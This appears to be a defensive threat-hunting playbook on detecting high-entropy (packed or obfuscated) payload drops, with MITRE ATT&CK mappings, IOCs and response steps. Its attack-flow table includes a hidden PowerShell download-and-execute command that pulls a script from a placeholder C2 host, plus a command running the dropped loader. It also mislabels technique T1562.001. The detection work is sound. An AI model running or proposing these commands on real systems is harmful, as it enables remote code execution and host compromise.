# 💥 High-Entropy Payload Drops (Polymorphic) – T1562.001 / T1027

**Explanation:** This playbook analyzes the staging phase where a malicious payload is written to disk, specifically targeting artifacts characterized by **High-Entropy**. High entropy (a measure of randomness) in a file segment or process memory is a high-confidence signature of packed, compressed, or **obfuscated content (T1027)**, used for **Defense Evasion (T1562.001)**. This drop event is the most reliable **Anchor Point** for detection, as it precedes execution.

---

## 1. Attack Flow, IOCs, and Simulated Commands

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1566.002 (Spearphishing Link) | **Network:** Malicious URL/IP accessed via browser/email. | (User clicks a link initiating a download) |
| **Execution/Loader** | T1059.003 (PowerShell) | **Process:** `powershell.exe` with base64 encoded command. | `powershell.exe -w hidden -c "IEX (new-object net.webclient).downloadstring('http://c2/dropper.ps1')"` |
| **Drop/Staging (ANCHOR)** | **T1562.001 (High-Entropy Drop)** | **File:** New executable (`.exe`, `.dll`) written to disk exhibiting **entropy > 7.0**. **Location:** Unusual file paths (`C:\Users\Public\temp\`). | (Dropper script executes a large write operation to disk using `System.IO.File.WriteAllBytes`) |
| **Execution** | T1059.001 (Command and Scripting) | **Process:** The dropped high-entropy file is executed by a legitimate parent (e.g., `cmd.exe` or `explorer.exe`). | `cmd.exe /c C:\Users\Public\temp\loader_7c3a.exe` |
| **Impact/C2** | T1071.001 (Application Layer Protocol) | **Network:** Consistent outbound beaconing traffic from the high-entropy payload process. | (Payload establishes C2 connection and begins activity, often via DNS or HTTPS) |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence File & Process IOCs

1.  **File Entropy Anomaly:** The single highest-fidelity IOC is the creation of a new file on disk (executable or DLL) where the **Shannon Entropy score is greater than 7.0** (out of 8.0). This indicates highly compressed or encrypted data.
2.  **Unusual File Names/Paths:** The high-entropy file is dropped into a suspicious, writable user or temporary directory (e.g., `C:\Temp`, `C:\ProgramData`, `C:\Users\Public`) often with a randomly generated name (e.g., `a7c3d9.exe`).
3.  **Process Spawn:** A legitimate process (`explorer.exe`, `cmd.exe`, or `powershell.exe`) is observed spawning a process from a file with high entropy and an unusual path.

### Network and Identity IOCs

1.  **Post-Execution Network Traffic:** Immediately after the high-entropy payload executes, observe outbound network connections to an external C2 IP/domain. Since the payload is often packed, initial network attempts may be a giveaway.
2.  **File Attributes:** The dropped file may have minimal or missing metadata (no Company Name, Product Version, or Digital Signature), suggesting it is not a legitimate, installed application.
3.  **Compromised Identity:** The user account executing the entire chain must be flagged for session revocation and credential reset, as the payload's execution means the host is now compromised under that user's context.
